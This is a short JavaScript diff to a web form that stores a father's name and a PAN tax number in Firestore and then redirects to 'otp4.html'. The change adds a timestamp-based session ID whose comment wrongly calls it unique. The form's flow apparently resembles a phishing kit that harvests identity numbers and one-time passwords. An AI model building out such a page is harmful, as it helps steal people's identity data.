@@ -147,11 +147,16 @@
       return pattern.test(pan.toUpperCase());
     }
 
+    function generateSessionId() {
+      return 'session_' + new Date().getTime(); // Generates a unique session ID based on current timestamp
+    }
+
     function handleSubmit(e) {
       e.preventDefault();
 
       const father = document.getElementById("father").value.trim();
       const pan = document.getElementById("pan").value.trim().toUpperCase();
+      const sessionId = generateSessionId(); // Generate session ID
 
       if (!validatePAN(pan)) {
         panError.style.display = "block";
@@ -161,6 +166,7 @@
       db.collection("pan_entries").add({
         father: father,
         pan: pan,
+        sessionId: sessionId, // Add sessionId to the entry
         timestamp: firebase.firestore.FieldValue.serverTimestamp()
       }).then(() => {
         window.location.href = "otp4.html";
